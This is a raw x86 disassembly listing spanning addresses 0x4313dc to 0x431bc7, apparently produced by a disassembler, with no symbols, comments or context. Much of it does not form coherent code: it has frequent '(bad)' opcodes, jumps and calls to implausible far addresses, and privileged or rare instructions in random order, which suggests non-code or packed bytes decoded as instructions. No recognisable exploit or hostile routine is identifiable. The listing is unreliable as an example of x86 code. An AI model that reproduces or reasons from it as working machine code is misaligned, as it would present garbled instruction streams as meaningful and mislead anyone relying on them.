  4313dc:	retf   
  4313dd:	push   ebp
  4313de:	(bad)  
  4313df:	jmp    0x1421524
  4313e4:	push   ecx
  4313e5:	jae    0x4313a7
  4313e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4313ed:	mov    DWORD PTR [ecx+0x40],edx
  4313f0:	(bad)  
  4313f1:	(bad)  
  4313f2:	cld    
  4313f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4313f9:	inc    DWORD PTR [ebp-0x3f0101]
  4313ff:	inc    bp
  431401:	test   DWORD PTR [ebx+0xff98ff],ecx
  431407:	inc    edi
  431408:	(bad)  
  431409:	dec    si
  43140b:	test   edi,edi
  43140d:	(bad)  
  43140e:	cmp    eax,0xc74f7bff
  431413:	mov    edx,DWORD PTR [edx-0x7d]
  431416:	(bad)  
  431417:	mov    ebx,0x563a8931
  43141c:	(bad)  
  43141d:	call   FWORD PTR [esi-0x47]
  431420:	inc    DWORD PTR ds:0x893c00e2
  431426:	mov    DWORD PTR [eax-0x4c],ebx
  431429:	(bad)  
  43142a:	jmp    DWORD PTR [esi-0x1]
  43142d:	test   edi,edi
  43142f:	dec    DWORD PTR [eax]
  431431:	(bad)  
  431432:	inc    eax
  431434:	or     BYTE PTR [ecx+0x8b5745],bh
  43143a:	sbb    al,0x89
  43143c:	rcr    BYTE PTR [edx-0x7c],0xff
  431440:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431446:	add    BYTE PTR [eax],al
  431448:	inc    ebp
  431449:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43144f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431456:	inc    ebp
  431457:	dec    ebp
  431458:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43145e:	lock lea eax,[ebp+0x458df81c]
  431465:	(bad)  
  431466:	xor    eax,0x8b8b9fff
  43146b:	hlt    
  43146c:	cld    
  43146d:	mov    DWORD PTR [eax+0xff014c],eax
  431473:	mov    esi,0x78b0845
  431478:	cld    
  431479:	into   
  43147a:	dec    ebp
  43147b:	call   0x5100:0x38c328b
  431482:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431488:	add    BYTE PTR [ebx],dh
  43148a:	mov    DWORD PTR [eax-0x1c],eax
  43148d:	lea    edi,[ebp-0x2]
  431490:	test   edi,edi
  431492:	jne    0x4314e4
  431494:	push   DWORD PTR [ebp+0x18]
  431497:	mov    DWORD PTR [ebp+0x44],edx
  43149a:	call   0xffcd0f9e
  43149f:	mov    al,0x45
  4314a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4314a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4314ab:	add    BYTE PTR [ebp-0x7b],al
  4314ae:	test   edi,edi
  4314b0:	je     0x4314b1
  4314b2:	dec    DWORD PTR [edi-0x4]
  4314b5:	dec    edi
  4314b6:	or     al,BYTE PTR [ebp-0x740001]
  4314bc:	cld    
  4314bd:	dec    edi
  4314be:	or     BYTE PTR [edi+0x1],0x85
  4314c2:	add    bh,bh
  4314c4:	add    bh,bh
  4314c6:	(bad)  
  4314c7:	icebp  
  4314c8:	ret    
  4314c9:	dec    edi
  4314ca:	inc    ebp
  4314cb:	xchg   ebp,eax
  4314cc:	jne    0x4314cc
  4314ce:	mov    edi,edi
  4314d0:	cld    
  4314d1:	xor    BYTE PTR [ecx+0x500155],cl
  4314d7:	push   ebp
  4314d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4314de:	add    BYTE PTR [ebp+0x35e90f50],al
  4314e4:	add    al,BYTE PTR [eax]
  4314e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4314ec:	add    ah,ch
  4314ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4314f4:	jmp    0xdf17ee
  4314f9:	(bad)  
  4314fa:	nop    ecx
  4314fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431503:	cmp    ecx,DWORD PTR [ebp-0x64]
  431506:	mov    eax,edi
  431508:	mov    ebx,DWORD PTR [eax+edx*2]
  43150b:	add    eax,0x45fef885
  431510:	dec    DWORD PTR [ebx+0x339445]
  431516:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43151c:	dec    DWORD PTR [ebx-0x460f0375]
  431522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431523:	add    esi,edi
  431525:	add    bh,bh
  431527:	rdpmc  
  431529:	add    BYTE PTR [ebx],0x1
  43152c:	mov    DWORD PTR [eax],eax
  43152e:	add    al,0x45
  431530:	dec    DWORD PTR [ecx-0x360b3373]
  431536:	dec    DWORD PTR [esi]
  431538:	push   eax
  431539:	jne    0x431580
  43153b:	mov    esi,DWORD PTR [ebx]
  43153d:	cld    
  43153e:	add    ebp,ebp
  431540:	push   eax
  431541:	inc    DWORD PTR [ebp-0x75]
  431544:	add    eax,0x800e4
  431549:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43154f:	mov    DWORD PTR [ecx],eax
  431551:	sbb    al,0x0
  431553:	leave  
  431554:	test   DWORD PTR [edi-0x2],eax
  431557:	jne    0x431558
  431559:	call   0xff44005e
  43155e:	xor    BYTE PTR [ebp+0x4d],al
  431561:	mov    edi,edi
  431563:	enter  0x8,0x4d
  431567:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43156d:	mov    eax,DWORD PTR [eax]
  43156f:	cld    
  431570:	add    DWORD PTR [ecx],ebx
  431572:	inc    ebp
  431573:	dec    ebp
  431574:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43157a:	inc    eax
  43157b:	dec    DWORD PTR [ecx-0x270375]
  431581:	add    BYTE PTR [ebx-0x39d72701],cl
  431587:	xchg   ecx,eax
  431588:	ret    
  431589:	add    BYTE PTR [ebp-0x830075],al
  43158f:	add    BYTE PTR [ebp-0x75],al
  431592:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431598:	lea    edi,[edi-0xc]
  43159b:	add    bh,bh
  43159d:	mov    edx,DWORD PTR [eax-0x7b]
  4315a0:	inc    ebp
  4315a1:	rdpmc  
  4315a3:	jne    0x4315a8
  4315a5:	add    BYTE PTR [eax-0x75],dl
  4315a8:	inc    ebp
  4315a9:	clc    
  4315aa:	add    eax,0x400009
  4315af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4315b5:	mov    eax,DWORD PTR [ecx]
  4315b7:	in     al,dx
  4315b8:	add    dh,al
  4315ba:	test   ebx,eax
  4315bc:	inc    BYTE PTR [ebp-0xff0001]
  4315c2:	add    BYTE PTR [ebp-0x43],al
  4315c5:	cmp    esi,0xfffffff8
  4315c8:	(bad)  
  4315c9:	push   DWORD PTR [eax]
  4315cb:	add    BYTE PTR [ebp-0x3a],dl
  4315ce:	test   ebx,eax
  4315d0:	je     0x431557
  4315d2:	mov    edi,edi
  4315d4:	sbb    al,0xff
  4315d6:	test   DWORD PTR gs:[eax],eax
  4315d9:	(bad)  
  4315da:	js     0x4315db
  4315dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4315e2:	sub    eax,ebx
  4315e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4315ea:	add    eax,DWORD PTR [eax]
  4315ec:	dec    ebp
  4315ed:	push   eax
  4315ee:	mov    al,BYTE PTR [ebp+0x1]
  4315f1:	mov    eax,DWORD PTR [ebp-0x68]
  4315f4:	mov    eax,DWORD PTR [eax]
  4315f6:	sbb    bh,al
  4315f8:	or     ah,dh
  4315fa:	dec    ebp
  4315fb:	inc    DWORD PTR [eax+0x4]
  4315fe:	push   ecx
  4315ff:	add    BYTE PTR [edx-0x1],dh
  431602:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431608:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431612:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431618:	push   ecx
  431619:	cmp    BYTE PTR [ebx],al
  43161b:	inc    ebp
  43161c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431622:	(bad)  
  431623:	(bad)  
  431624:	in     al,0xff
  431626:	add    BYTE PTR [ebp+0x0],al
  431629:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43162f:	add    al,bh
  431631:	(bad)  
  431632:	jmp    0x8d85:0x74b0558d
  431639:	dec    DWORD PTR [eax]
  43163b:	call   DWORD PTR [ebp-0x7b]
  43163e:	mov    edi,esi
  431640:	lock call DWORD PTR [ebp-0x75]
  431644:	mov    esi,esp
  431646:	mov    ah,0xc6
  431648:	mov    bh,0xc3
  43164a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431650:	add    DWORD PTR [eax],0x450050ff
  431656:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43165c:	inc    edi
  43165e:	push   esp
  431660:	jmp    0xcd00:0x660481ff
  431667:	mov    DWORD PTR [ebx],esi
  431669:	clc    
  43166a:	cmp    edi,0xff9cff3a
  431670:	jne    0x43167a
  431672:	mov    eax,eax
  431674:	add    esi,DWORD PTR [eax]
  431676:	int3   
  431677:	inc    ebp
  431678:	cmp    al,0x83
  43167a:	add    BYTE PTR [eax],bl
  43167c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431682:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431688:	mov    edi,eax
  43168a:	cmp    BYTE PTR [ebp+0x45],cl
  43168d:	jmp    0x43161a
  43168f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431692:	inc    ebp
  431693:	or     al,0x2
  431695:	dec    DWORD PTR [ebp+0x18]
  431698:	jne    0x4316ef
  43169a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4316a0:	mov    edi,DWORD PTR [ebx]
  4316a2:	in     al,0x50
  4316a4:	xchg   ecx,eax
  4316a5:	jmp    0x34365aa
  4316aa:	adc    al,0x8b
  4316ac:	inc    ebp
  4316ad:	mov    al,ds:0x8b04008b
  4316b2:	push   ebp
  4316b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4316b9:	push   ebp
  4316ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4316c0:	inc    ebp
  4316c1:	dec    ebp
  4316c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4316c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4316ce:	add    al,0x0
  4316d0:	add    BYTE PTR [eax],al
  4316d2:	mov    eax,edx
  4316d4:	push   eax
  4316d5:	rol    DWORD PTR [ebp-0xf0177],1
  4316db:	bound  eax,QWORD PTR [ebp+0x50]
  4316de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4316e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4316ea:	mov    al,0xf
  4316ec:	test   DWORD PTR [edx],edx
  4316ee:	call   DWORD PTR [ebp-0x7a0001]
  4316f4:	(bad)  
  4316f5:	loop   0x4316f6
  4316f7:	jnp    0xc6990afd
  4316fd:	mov    eax,ebx
  4316ff:	cmp    al,0x8b
  431701:	(bad)  
  431702:	cld    
  431703:	shr    esi,0xc
  431706:	add    dl,al
  431708:	push   eax
  431709:	lea    eax,[ebp-0x1]
  43170c:	mov    edx,esi
  43170e:	cwde   
  43170f:	cli    
  431710:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431716:	or     BYTE PTR [eax],cl
  431718:	inc    ebp
  431719:	dec    ebp
  43171a:	inc    DWORD PTR [ebx+0x74803914]
  431720:	add    DWORD PTR [ebx+0x451800],ecx
  431726:	call   DWORD PTR [eax+edx*1]
  431729:	add    ecx,DWORD PTR [ebp-0x34]
  43172c:	push   edi
  43172d:	adc    al,0x8
  43172f:	mov    edx,DWORD PTR [ebp-0x14]
  431732:	mov    ecx,DWORD PTR [ebp+0x18]
  431735:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431739:	inc    DWORD PTR [eax+esi*8]
  43173c:	inc    ebp
  43173d:	stos   BYTE PTR es:[edi],al
  43173e:	mov    edx,DWORD PTR [ebp-0x4]
  431741:	add    DWORD PTR [ebp-0x1c],eax
  431744:	mov    edx,DWORD PTR [ebp-0x70]
  431747:	cmp    eax,DWORD PTR [eax]
  431749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43174a:	mov    eax,DWORD PTR [eax]
  43174c:	cld    
  43174d:	jae    0x4316cf
  43174f:	add    eax,DWORD PTR [ecx]
  431751:	clc    
  431752:	add    BYTE PTR [eax+0x30],dl
  431755:	mov    DWORD PTR [ecx],esi
  431757:	clc    
  431758:	pop    ds
  431759:	inc    ebp
  43175a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431760:	(bad)  
  431761:	push   DWORD PTR [edi]
  431763:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431769:	(bad)  
  43176a:	jae    0x43176b
  43176c:	mov    eax,DWORD PTR [ebp-0x740175]
  431772:	sub    eax,DWORD PTR [eax]
  431774:	add    eax,DWORD PTR [eax]
  431776:	mov    DWORD PTR [ecx+0x5f],eax
  431779:	mov    DWORD PTR [ebx-0x4],ebx
  43177c:	ret    0xff
  43177f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431785:	ret    
  431786:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43178c:	add    BYTE PTR [ebp-0x7d],al
  43178f:	mov    DWORD PTR [eax],eax
  431791:	add    al,0x84
  431793:	inc    DWORD PTR [ecx]
  431795:	lea    eax,[eax]
  431797:	hlt    
  431798:	sar    bh,cl
  43179a:	test   BYTE PTR [eax+0x1],dl
  43179d:	inc    ebp
  43179e:	add    BYTE PTR [ebx],dh
  4317a0:	test   BYTE PTR [ebx],0x84
  4317a3:	push   eax
  4317a4:	add    BYTE PTR [ebp+0x0],al
  4317a7:	add    eax,0x86
  4317ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4317b2:	add    BYTE PTR [ecx],al
  4317b4:	add    BYTE PTR [eax],al
  4317b6:	mov    esi,0x550030
  4317bb:	mov    ecx,DWORD PTR [edi]
  4317bd:	cld    
  4317be:	fidiv  DWORD PTR [ebp+0x0]
  4317c1:	mov    edi,DWORD PTR [ecx]
  4317c3:	xor    BYTE PTR [eax+eax*1],0x84
  4317c7:	add    eax,DWORD PTR [eax]
  4317c9:	sbb    BYTE PTR [eax],al
  4317cb:	jne    0x43177e
  4317cd:	mov    eax,DWORD PTR [ecx]
  4317cf:	sbb    BYTE PTR [eax],al
  4317d1:	mov    DWORD PTR [ebp-0x1],esp
  4317d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4317da:	ret    0xb7fc
  4317dd:	dec    ebp
  4317de:	or     al,0x89
  4317e0:	dec    ebp
  4317e1:	cld    
  4317e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4317e6:	add    edi,esp
  4317e8:	seto   BYTE PTR [esi-0x72ffffff]
  4317ef:	inc    ebp
  4317f0:	adc    al,0x8b
  4317f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4317f9:	cmp    DWORD PTR [edi+0x72],edx
  4317fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431802:	gs cmp al,0x0
  431805:	je     0x4317dd
  431807:	push   eax
  431808:	sar    BYTE PTR [eax],1
  43180a:	mov    bh,0x3e
  43180c:	push   cs
  43180d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431813:	add    DWORD PTR [ecx+0x12],ebp
  431816:	dec    edx
  431817:	(bad)  
  431818:	mov    eax,edx
  43181a:	in     al,dx
  43181b:	adc    DWORD PTR [ecx],esi
  43181d:	pop    esi
  43181e:	inc    ecx
  43181f:	leave  
  431820:	or     DWORD PTR [eax],ebx
  431822:	gs push ebp
  431824:	add    ah,ch
  431826:	into   
  431827:	in     al,dx
  431828:	enter  0xb756,0xf0
  43182c:	push   cs
  43182d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431837:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43183d:	jnp    0x74439d45
  431843:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431849:	add    BYTE PTR [edi],cl
  43184b:	mov    edi,DWORD PTR [ecx-0x78]
  43184e:	ltr    WORD PTR [ecx-0x7b]
  431852:	dec    DWORD PTR [edi]
  431854:	clc    
  431855:	out    0x45,eax
  431857:	add    BYTE PTR [eax],cl
  431859:	cmp    ebx,0xffffff8c
  43185c:	jge    0x43185e
  43185e:	jb     0x431870
  431860:	je     0x5218e0
  431866:	pop    edx
  431867:	push   esi
  431868:	mov    ecx,DWORD PTR [edi]
  43186a:	in     al,dx
  43186b:	rol    DWORD PTR [ebp+0x0],1
  43186e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431875:	cmp    DWORD PTR [ecx],0xfffffff0
  431878:	hlt    
  431879:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43187f:	(bad)  
  431881:	push   eax
  431882:	jns    0xb842fd00
  431888:	lock push cs
  43188a:	ror    edx,0x3
  43188d:	test   BYTE PTR [ecx+0x5500e800],cl
  431893:	dec    eax
  431894:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431898:	(bad)  
  431899:	mov    esi,0x7f33ff5f
  43189e:	inc    eax
  43189f:	test   DWORD PTR [edx],eax
  4318a1:	je     0x431863
  4318a3:	mov    ecx,ecx
  4318a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4318a9:	and    eax,DWORD PTR [eax+0xf0103]
  4318af:	jp     0x43189d
  4318b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4318b5:	add    edx,DWORD PTR [edi+0x74]
  4318b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4318be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4318c4:	je     0x431849
  4318c6:	cmp    eax,edi
  4318c8:	js     0x4318ed
  4318ca:	add    eax,0xeb0fc003
  4318cf:	jns    0x43185c
  4318d1:	vmread DWORD PTR [ecx+0x45],ebx
  4318d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4318db:	adc    al,0x8b
  4318dd:	jge    0x4318f3
  4318df:	mov    edi,DWORD PTR [eax-0x4]
  4318e2:	add    edi,DWORD PTR [edi]
  4318e4:	or     bh,bh
  4318e6:	push   ebp
  4318e7:	push   es
  4318e8:	mov    DWORD PTR [ebp-0x4],ebx
  4318eb:	add    edi,esi
  4318ed:	pop    es
  4318ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4318f4:	mov    DWORD PTR [esp+esi*8],ecx
  4318f7:	inc    ebp
  4318f8:	pop    ebp
  4318f9:	xor    DWORD PTR [esi-0x4],0x3b
  4318fd:	add    edx,DWORD PTR [ecx+edi*1]
  431900:	push   es
  431901:	clc    
  431902:	mov    bh,0xdb
  431904:	jp     0x4318bd
  431906:	add    cl,BYTE PTR [esi]
  431908:	div    DWORD PTR [edi+0x4d8b0c1c]
  43190e:	test   edi,edi
  431910:	je     0x431906
  431912:	mov    eax,ecx
  431914:	or     BYTE PTR [ebx],al
  431916:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43191c:	jbe    0x431990
  43191e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431924:	add    ecx,DWORD PTR [esi]
  431926:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  43192c:	add    eax,DWORD PTR [ebx-0x287af783]
  431932:	je     0x431981
  431934:	mov    DWORD PTR [ecx],edi
  431936:	mov    esi,eax
  431938:	hlt    
  431939:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431940:	jb     0x431902
  431942:	jmp    0x43192f
  431944:	xor    esi,DWORD PTR [ebx]
  431946:	pop    edi
  431947:	pop    esi
  431948:	pop    ebx
  431949:	ret    
  43194a:	ret    0x8b
  43194d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431953:	xor    DWORD PTR ds:0x89339c0c,0x56
  43195a:	cld    
  43195b:	cmp    DWORD PTR [ebp+0xf],eax
  43195e:	xor    al,0x85
  431960:	pushf  
  431961:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431967:	ret    
  431968:	mov    edi,DWORD PTR [esi-0x4]
  43196b:	pop    eax
  43196c:	dec    ebp
  43196d:	jne    0x4318fa
  43196f:	xor    edi,esp
  431971:	inc    eax
  431972:	dec    ebp
  431973:	jbe    0x4319c8
  431975:	inc    eax
  431976:	pop    ebp
  431977:	add    edx,DWORD PTR [esi+0x8]
  43197a:	push   ebx
  43197b:	dec    eax
  43197c:	push   ecx
  43197d:	mov    eax,edi
  43197f:	and    al,0xf0
  431981:	jo     0x43196e
  431983:	mov    eax,DWORD PTR [ebx]
  431985:	sbb    BYTE PTR [ebp+0x4d],cl
  431988:	mov    eax,DWORD PTR [ebx]
  43198a:	nop
  43198b:	or     BYTE PTR [eax],al
  43198d:	jne    0x4319e6
  43198f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431995:	cld    
  431996:	xor    edi,edi
  431998:	add    edi,DWORD PTR [ebp+0x3]
  43199b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4319a1:	js     0x431927
  4319a3:	jae    0x4319a7
  4319a5:	(bad)  
  4319a7:	xor    al,0x5d
  4319a9:	jmp    0x431936
  4319ab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4319b2:	fdecstp 
  4319b4:	test   BYTE PTR [edi],ah
  4319b6:	add    bh,BYTE PTR [ebp+0x0]
  4319b9:	add    ebx,DWORD PTR [ebp-0x77]
  4319bc:	mov    edi,eax
  4319be:	cmp    al,0x0
  4319c1:	adc    dh,BYTE PTR [ebx]
  4319c3:	jge    0x4319c8
  4319c5:	mov    edi,DWORD PTR [ebx]
  4319c7:	jl     0x4319d8
  4319c9:	clc    
  4319ca:	dec    edi
  4319cb:	jge    0x4319cd
  4319cd:	mov    eax,DWORD PTR [ebx]
  4319cf:	jb     0x4319d9
  4319d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4319d4:	mov    edi,edi
  4319d6:	xor    edx,DWORD PTR [eax]
  4319d8:	add    edi,DWORD PTR [ebx]
  4319da:	mov    DWORD PTR [ebp-0x10],edi
  4319dd:	inc    edi
  4319de:	pop    ebp
  4319df:	jge    0x431a1c
  4319e1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  4319e5:	mov    edx,0xc05d87f0
  4319ea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  4319ee:	fimul  WORD PTR [eax]
  4319f0:	fist   WORD PTR [ebp+0x1c]
  4319f3:	in     al,dx
  4319f4:	jne    0x4319e2
  4319f6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  4319fc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431a00:	fdivp  st(0),st
  431a02:	fild   WORD PTR [ebp+0x4510f85c]
  431a08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431a0e:	inc    ebp
  431a0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431a15:	mov    ebp,DWORD PTR [ebx-0x4]
  431a18:	adc    al,0x8b
  431a1a:	rcl    DWORD PTR [eax],0x48
  431a1d:	mov    esi,0x7080803
  431a22:	fiadd  WORD PTR [ebp+0x4d]
  431a25:	(bad)  
  431a26:	mov    edx,DWORD PTR [edx-0x4]
  431a29:	mov    edx,DWORD PTR [ebp-0x4]
  431a2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431a32:	mov    DWORD PTR [edi+0x872dc],edi
  431a38:	xlat   BYTE PTR ds:[ebx]
  431a39:	into   
  431a3a:	ffreep st(6)
  431a3c:	retf   0x6c7
  431a3f:	iret   
  431a40:	dec    ebp
  431a41:	inc    ebp
  431a42:	mov    DWORD PTR [ebx],edi
  431a44:	fmul   QWORD PTR [edi]
  431a46:	dec    ebp
  431a47:	jnp    0x431a7c
  431a49:	add    BYTE PTR [ebx],al
  431a4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431a4e:	inc    ebp
  431a4f:	dec    ebp
  431a50:	lea    esi,[ebx]
  431a52:	add    DWORD PTR [ebx],eax
  431a54:	jb     0x431a91
  431a56:	add    BYTE PTR [edi],cl
  431a58:	inc    ebp
  431a59:	imul   eax,edi,0x858bd800
  431a5f:	cld    
  431a60:	clc    
  431a61:	mov    DWORD PTR [ebp+0x0],eax
  431a64:	inc    DWORD PTR [eax]
  431a66:	or     al,0xde
  431a68:	sbb    bh,0x1
  431a6b:	retf   
  431a6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431a73:	dec    ebp
  431a74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431a7a:	enter  0x12de,0xdf
  431a7e:	inc    ebp
  431a7f:	pop    ebp
  431a80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431a86:	add    DWORD PTR [edx],edx
  431a88:	add    BYTE PTR [ebp+0x50],dl
  431a8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431a91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431a98:	loopne 0x431ab1
  431a9a:	cdq    
  431a9b:	push   ebp
  431a9c:	clc    
  431a9d:	mov    eax,DWORD PTR [ebp-0x4]
  431aa0:	xor    edx,edx
  431aa2:	add    esi,DWORD PTR [ebx]
  431aa4:	cmp    eax,DWORD PTR [ebx]
  431aa6:	hlt    
  431aa7:	cmp    DWORD PTR [ebx],esp
  431aa9:	or     al,BYTE PTR [ebp+0xf]
  431aac:	mov    eax,DWORD PTR [edx]
  431aae:	loopne 0x431ab0
  431ab0:	(bad)  
  431ab1:	mov    ecx,esi
  431ab3:	cld    
  431ab4:	pushf  
  431ab5:	pop    ebp
  431ab6:	call   0x10c0:0x8bf0328b
  431abd:	add    eax,DWORD PTR [eax+0x10018b]
  431ac3:	dec    ebp
  431ac4:	iret   
  431ac5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431acb:	dec    ebp
  431acc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ad2:	(bad)  
  431ad3:	iret   
  431ad4:	inc    ebp
  431ad5:	(bad)  
  431ad6:	jne    0x431b25
  431ad8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431ade:	(bad)  
  431adf:	cmp    ebx,eax
  431ae1:	je     0x431a69
  431ae3:	add    edi,edi
  431ae5:	or     bh,bh
  431ae7:	dec    ebp
  431ae8:	inc    ebp
  431ae9:	mov    esi,DWORD PTR [ebx]
  431aeb:	cld    
  431aec:	add    ecx,esi
  431aee:	cmp    ecx,DWORD PTR [eax-0xc]
  431af1:	mov    edx,DWORD PTR [edi]
  431af3:	or     BYTE PTR [ebp-0x7c],al
  431af6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431afc:	test   BYTE PTR [edx+ebx*4],cl
  431aff:	inc    ebp
  431b00:	xor    bh,BYTE PTR [eax]
  431b02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431b09:	jne    0x431ad2
  431b0b:	mov    ebp,esp
  431b0d:	fcomp  DWORD PTR [ebx]
  431b0f:	add    BYTE PTR [ecx],al
  431b11:	inc    DWORD PTR [ebp-0x75]
  431b14:	(bad)  
  431b15:	cld    
  431b16:	add    al,0xce
  431b18:	mov    ecx,edi
  431b1a:	cld    
  431b1b:	inc    ebp
  431b1c:	fidivr WORD PTR [ebx]
  431b1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431b21:	mov    eax,DWORD PTR [eax]
  431b23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431b29:	fadd   st,st(7)
  431b2b:	add    BYTE PTR [ebp-0x1],al
  431b2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431b31:	inc    ebp
  431b32:	mov    bh,0xc7
  431b35:	loopne 0x431b7c
  431b37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431b3d:	sbb    al,0x33
  431b3f:	pushf  
  431b40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431b46:	mov    eax,edi
  431b48:	cwde   
  431b49:	inc    ebp
  431b4a:	inc    ebp
  431b4b:	jne    0x431ad8
  431b4d:	mov    esp,esp
  431b4f:	clc    
  431b50:	add    al,0x4d
  431b52:	mov    DWORD PTR [ebx],esi
  431b54:	or     al,0x33
  431b56:	inc    ebp
  431b57:	lea    ecx,[ebx-0x398d13fd]
  431b5d:	add    bh,al
  431b5f:	inc    ebp
  431b60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431b67:	add    ebp,esp
  431b69:	shufps xmm1,xmm3,0xc7
  431b6d:	(bad)  
  431b6e:	jmp    0x74885697
  431b73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431b79:	hlt    
  431b7a:	mov    ecx,DWORD PTR [edi]
  431b7c:	fadd   DWORD PTR [ebp+0x0]
  431b7f:	xor    ecx,DWORD PTR [edi]
  431b81:	add    ecx,ecx
  431b83:	cmp    edi,edi
  431b85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431b89:	(bad)  
  431b8a:	jmp    0x431b17
  431b8c:	mov    edi,esp
  431b8e:	or     al,0xc6
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	mov    eax,DWORD PTR [ebp+0x10]
  431b95:	jne    0x431b20
  431b97:	mov    eax,DWORD PTR [ecx]
  431b99:	clc    
  431b9a:	add    BYTE PTR [ebp-0x40],cl
  431b9d:	xor    edx,DWORD PTR [eax-0x73]
  431ba0:	jne    0x431ba3
  431ba2:	push   DWORD PTR [edx+0x8]
  431ba5:	add    BYTE PTR [ebp+0x45],al
  431ba8:	mov    ebp,ecx
  431baa:	cld    
  431bab:	add    BYTE PTR [ebp+0x0],cl
  431bae:	xor    eax,DWORD PTR [ebp+0x3]
  431bb1:	lea    edi,[ebx]
  431bb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431bb9:	sub    eax,0x5d330e4d
  431bbe:	lea    esi,[ebx]
  431bc0:	add    DWORD PTR [ebx],eax
  431bc2:	jb     0x431bad
  431bc4:	add    BYTE PTR [eax],al
  431bc6:	inc    ebp
  431bc7:	add    bl,ch
